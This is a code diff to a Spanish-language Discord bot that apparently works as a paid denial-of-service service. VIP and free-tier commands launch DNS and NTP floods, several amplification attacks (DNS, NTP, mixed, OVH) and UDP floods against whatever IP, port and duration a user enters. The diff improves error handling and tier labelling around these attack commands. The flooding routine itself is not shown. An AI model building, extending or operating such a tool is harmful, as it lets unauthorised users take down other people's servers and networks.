@@ -2,6 +2,7 @@ import discord
 from discord.ext import commands
 import requests
 import os
+import time
 
 from config import OWNER_ID, IMAGE_URLS
 from users import is_vip, add_vip_user, remove_vip_user, list_users
@@ -93,7 +94,7 @@ async def adduser_cmd(ctx, user_id: str):
     if str(ctx.author.id) != OWNER_ID:
         return await ctx.send("⛔ Solo el creador puede usar este comando")
     add_vip_user(user_id)
-    await ctx.send(f"✅ Usuario `{user_id}` agregado como VIP.")
+    await ctx.send(f"✅ Usuario `{user_id}` agregado como VIP")
 
 @bot.command(name='defuser')
 async def defuser_cmd(ctx, user_id: str):
@@ -116,7 +117,7 @@ async def info_cmd(ctx):
     )
     await ctx.send(embed=embed)
 
-# ===== MÉTODOS DE ATAQUE (VIP) =====
+# ===== MÉTODOS DE ATAQUE (VIP & FREE) =====
 
 def create_attack_callback(ctx, title):
     async def callback():
@@ -128,11 +129,15 @@ def create_attack_callback(ctx, title):
         await ctx.send(embed=embed)
     return callback
 
+# --- VIP ---
+
 @bot.command(name='dnsflood')
 async def dnsflood_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("dns", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS Flood")()))
+    result = start_attack("dns", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS Flood")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("🚀 DNS Flood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
     await ctx.send(embed=embed)
 
@@ -140,7 +145,9 @@ async def dnsflood_cmd(ctx, ip: str, port: int, duration: int):
 async def ntpflood_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("ntp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP Flood")()))
+    result = start_attack("ntp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP Flood")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("🚀 NTP Flood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["attack"])
     await ctx.send(embed=embed)
 
@@ -148,7 +155,9 @@ async def ntpflood_cmd(ctx, ip: str, port: int, duration: int):
 async def dns_amp_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("dns-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS-AMP")()))
+    result = start_attack("dns-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "DNS-AMP")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💥 DNS-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
     await ctx.send(embed=embed)
 
@@ -156,7 +165,9 @@ async def dns_amp_cmd(ctx, ip: str, port: int, duration: int):
 async def ntp_amp_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("ntp-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP-AMP")()))
+    result = start_attack("ntp-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "NTP-AMP")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💥 NTP-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
     await ctx.send(embed=embed)
 
@@ -164,7 +175,9 @@ async def ntp_amp_cmd(ctx, ip: str, port: int, duration: int):
 async def mix_amp_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("mix-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "MIX-AMP")()))
+    result = start_attack("mix-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "MIX-AMP")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💥 MIX-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
     await ctx.send(embed=embed)
 
@@ -172,9 +185,13 @@ async def mix_amp_cmd(ctx, ip: str, port: int, duration: int):
 async def ovh_amp_cmd(ctx, ip: str, port: int, duration: int):
     if not is_vip(ctx.author.id):
         return await ctx.send("🚫 Este método es solo para usuarios VIP")
-    start_attack("ovh-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "OVH-AMP")()))
+    result = start_attack("ovh-amp", ip, port, duration, on_finish=lambda: bot.loop.create_task(create_attack_callback(ctx, "OVH-AMP")()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💥 OVH-AMP iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["amp"])
     await ctx.send(embed=embed)
+
+# --- FREE ---
 
 @bot.command(name='udppps')
 async def udppps_cmd(ctx, ip: str, port: int, duration: int):
@@ -184,7 +201,9 @@ async def udppps_cmd(ctx, ip: str, port: int, duration: int):
         embed = make_embed("✅ UDPPPS terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
-    start_attack("udppps", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    result = start_attack("udppps", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💣 UDPPPS iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
     await ctx.send(embed=embed)
 
@@ -194,7 +213,9 @@ async def udpdown_cmd(ctx, ip: str, port: int, duration: int):
         embed = make_embed("✅ UDPDown terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
-    start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    result = start_attack("udpdown", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💣 UDPDown iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
     await ctx.send(embed=embed)
 
@@ -204,7 +225,9 @@ async def udpflood_cmd(ctx, ip: str, port: int, duration: int):
         embed = make_embed("✅ UDPFlood terminado", "El ataque ha finalizado", IMAGE_URLS["free"])
         await ctx.send(embed=embed)
 
-    start_attack("udpflood", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    result = start_attack("udpflood", ip, port, duration, on_finish=lambda: bot.loop.create_task(notify_end()))
+    if result:
+        return await ctx.send(result)
     embed = make_embed("💥 UDPFlood iniciado", f"Objetivo: `{ip}:{port}`\nDuración: `{duration}s`", IMAGE_URLS["free"])
     await ctx.send(embed=embed)
 
